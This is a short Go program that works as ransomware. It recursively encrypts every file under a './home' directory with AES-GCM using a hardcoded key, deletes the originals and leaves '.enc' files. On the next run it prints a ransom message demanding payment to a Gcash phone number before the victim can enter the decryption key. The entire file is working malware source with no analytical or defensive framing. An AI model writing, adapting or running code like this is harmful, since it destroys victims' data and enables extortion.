package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"fmt"
	"os"
	"path/filepath"
	"strings"
)

func main() {
	// Hardcoded encryption key
	key := []byte("thisisthesecretkeythatwillbeused")

	// Check if the content in "./home" directory is encrypted
	isEncrypted := checkEncryption("./home")

	// If content is encrypted, prompt for decryption key
	if isEncrypted {
		fmt.Println("Please send me Gcash - 09567201068 and I will send you the key :)")
		fmt.Print("The content is encrypted. Enter the decryption \nkey: ")
		var decryptionKey string
		fmt.Scanln(&decryptionKey)
		// Attempt decryption
		err := decryptDirectory("./home", decryptionKey)
		if err != nil {
			fmt.Println("Wrong key. Decryption failed.")
		} else {
			fmt.Println("Decryption successful.")
		}
	} else {
		// Attempt encryption
		err := encryptDirectory("./home", key)
		if err != nil {
			fmt.Println("Encryption failed:", err)
		} else {
			fmt.Println("Encryption successful.")
		}
	}
}

// checkEncryption checks if any file in the given directory is encrypted
func checkEncryption(directory string) bool {
	var isEncrypted bool
	filepath.Walk(directory, func(path string, info os.FileInfo, err error) error {
		if !info.IsDir() && strings.HasSuffix(path, ".enc") {
			isEncrypted = true
		}
		return nil
	})
	return isEncrypted
}

// encryptDirectory encrypts all files in the given directory using the provided key
func encryptDirectory(directory string, key []byte) error {
	block, err := aes.NewCipher(key)
	if err != nil {
		return err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return err
	}
	return filepath.Walk(directory, func(path string, info os.FileInfo, err error) error {
		if !info.IsDir() {
			original, err := os.ReadFile(path)
			if err != nil {
				return err
			}
			nonce := make([]byte, gcm.NonceSize())
			if _, err := rand.Read(nonce); err != nil {
				return err
			}
			encrypted := gcm.Seal(nonce, nonce, original, nil)
			err = os.WriteFile(path+".enc", encrypted, 0666)
			if err != nil {
				return err
			}
			os.Remove(path) // Delete the original file
		}
		return nil
	})
}

// decryptDirectory decrypts all encrypted files in the given directory using the provided key
func decryptDirectory(directory, key string) error {
	block, err := aes.NewCipher([]byte(key))
	if err != nil {
		return err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return err
	}
	return filepath.Walk(directory, func(path string, info os.FileInfo, err error) error {
		if !info.IsDir() && strings.HasSuffix(path, ".enc") {
			encrypted, err := os.ReadFile(path)
			if err != nil {
				return err
			}
			nonceSize := gcm.NonceSize()
			if len(encrypted) < nonceSize {
				return fmt.Errorf("ciphertext too short")
			}
			nonce, ciphertext := encrypted[:nonceSize], encrypted[nonceSize:]
			decrypted, err := gcm.Open(nil, nonce, ciphertext, nil)
			if err != nil {
				return err
			}
			err = os.WriteFile(strings.TrimSuffix(path, ".enc"), decrypted, 0666)
			if err != nil {
				return err
			}
			os.Remove(path) // Delete the encrypted file
		}
		return nil
	})
}
